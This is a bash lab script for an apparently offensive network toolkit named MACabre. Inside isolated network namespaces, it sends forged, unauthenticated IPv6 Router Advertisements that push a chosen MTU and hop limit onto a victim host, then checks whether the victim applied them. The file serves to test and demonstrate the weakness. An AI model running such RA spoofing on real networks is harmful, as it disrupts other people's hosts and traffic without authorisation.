#!/usr/bin/env bash
# Isolated SLAAC configuration abuse lab (Linux only, needs root and IPv6 in the kernel).
#
# Topology, all inside network namespaces, on one bridge:
#
#   victim:   a host that accepts Router Advertisements (default kernel setting). It has no router.
#   attacker: a host that sends RAs with MACabre's module, carrying a chosen MTU and hop limit.
#
# Phases:
#   Phase 1 (control): no RA has been sent. The victim's IPv6 link MTU and current hop limit must differ from
#            the values the attacker will advertise. If they already match, the lab cannot tell anything
#            and exits 2.
#   Phase 2 (attack): the attacker sends RAs. The victim must apply the advertised MTU to its interface,
#            and the advertised hop limit to its IPv6 defaults. The IPv6 link MTU is read from
#            /proc/sys/net/ipv6/conf/<if>/mtu; the device MTU is not changed by an RA.
#
# Exit 0 when the control holds and the victim applied both values. Exit 1 when either does not hold.
# Exit 2 when the control failed.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/slaac_configuration_abuse_lab.sh
#
# Requirements: iproute2 (ip) with IPv6 enabled in the kernel, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

if ! command -v ip >/dev/null 2>&1; then
    echo "Missing required tool: ip" >&2
    exit 1
fi

if [[ ! -e /proc/sys/net/ipv6 ]]; then
    echo "This lab needs IPv6 in the kernel." >&2
    exit 1
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
TARGET_MTU=1280
TARGET_HOP_LIMIT=32
ATTACKER_MAC="02:00:00:00:10:03"
VICTIM_MAC="02:00:00:00:10:02"

stop_lab() {
    for ns in lan victim attacker; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

stop_lab

ip netns add lan
ip netns add victim
ip netns add attacker

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for pair in "vic:victim:$VICTIM_MAC" "atk:attacker:$ATTACKER_MAC"; do
    IFS=: read -r name ns mac <<<"$pair"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
    ip netns exec "$ns" ip link set "h-$name" address "$mac"
    ip netns exec "$ns" ip link set "h-$name" up
done

SEND_CODE='
import sys, threading
from macabre.attacks.slaac_configuration_abuse import SlaacConfigurationAbuseConfig, run_slaac_configuration_abuse
stats = run_slaac_configuration_abuse(
    SlaacConfigurationAbuseConfig(iface=sys.argv[1], source_mac=sys.argv[2], mtu=int(sys.argv[3]), hop_limit=int(sys.argv[4]), frames=3),
    threading.Event(), lambda _s: None,
)
print(stats.frames)
'

# Prints the IPv6 link MTU the victim uses. An RA MTU option sets this value (net.ipv6.conf.<if>.mtu),
# not the device MTU, which stays the same.
victim_mtu() {
    ip netns exec victim cat /proc/sys/net/ipv6/conf/h-vic/mtu 2>/dev/null || echo unknown
}

# Prints the victim's device MTU, for information only.
victim_device_mtu() {
    ip netns exec victim cat /sys/class/net/h-vic/mtu 2>/dev/null || echo unknown
}

# Prints the victim's current hop limit for IPv6 (applied from Router Advertisements).
victim_hop_limit() {
    ip netns exec victim cat /proc/sys/net/ipv6/conf/h-vic/hop_limit 2>/dev/null || echo unknown
}

echo "Phase 1: control, no RA sent"
sleep 2
BASE_MTU="$(victim_mtu)"
BASE_HOP="$(victim_hop_limit)"
echo "  victim IPv6 link MTU: $BASE_MTU (advertised target: $TARGET_MTU)"
echo "  victim IPv6 hop limit: $BASE_HOP (advertised target: $TARGET_HOP_LIMIT)"
echo

echo "Phase 2: attacker sends Router Advertisements with MTU $TARGET_MTU and hop limit $TARGET_HOP_LIMIT, with MACabre's module"
SENT="$(ip netns exec attacker env PYTHONPATH="$ROOT/src" "$PY" -c "$SEND_CODE" h-atk "$ATTACKER_MAC" "$TARGET_MTU" "$TARGET_HOP_LIMIT" 2>/dev/null || echo 0)"
echo "  advertisements sent: $SENT"
sleep 4
MTU="$(victim_mtu)"
HOP="$(victim_hop_limit)"
echo "  victim IPv6 link MTU: $MTU"
echo "  victim device MTU (unchanged by RA, for information): $(victim_device_mtu)"
echo "  victim IPv6 hop limit: $HOP"
echo

if [[ "$BASE_MTU" == "$TARGET_MTU" || "$BASE_HOP" == "$TARGET_HOP_LIMIT" ]]; then
    echo "Control: the victim already used the advertised values before the attack. Result unreliable."
    exit 2
fi
if [[ "$MTU" == "$TARGET_MTU" && "$HOP" == "$TARGET_HOP_LIMIT" ]]; then
    echo "Result: the victim applied the advertised MTU ($TARGET_MTU) and hop limit ($TARGET_HOP_LIMIT) from unauthenticated RAs. Vulnerable: every host that accepts the RA uses the forged values for its traffic."
    exit 0
fi
echo "Result: the victim did not apply the advertised values (MTU: $MTU, hop limit: $HOP). Not validated."
exit 1
